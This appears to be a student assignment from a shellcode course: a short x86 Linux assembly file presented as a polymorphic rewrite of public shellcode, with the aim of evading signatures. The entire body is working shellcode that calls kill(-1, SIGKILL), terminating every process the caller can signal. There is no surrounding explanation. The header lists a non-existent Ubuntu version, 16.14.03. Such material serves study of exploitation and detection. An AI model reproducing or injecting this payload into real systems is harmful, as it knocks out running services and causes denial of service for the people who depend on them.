; SLAE - Assignment #6: Polymorphic version of existing shellcode (Linux/x86)
; Source : http://shell-storm.org/shellcode/files/shellcode-212.php
; Source Shellcode : 11 byte shellcode to kill all processes for Linux/x86
; Polymorphic version 13 bytes
; Author: Alain Menelet 
; StudentID - PA-3763
; Tested on Ubuntu 16.14.03 LTS

global _start

section .text

_start:

    xor ecx, ecx
    mul ecx
    mov al, 0x25
    push byte -1
    pop ebx
    mov cl, 0x9
    int 0x80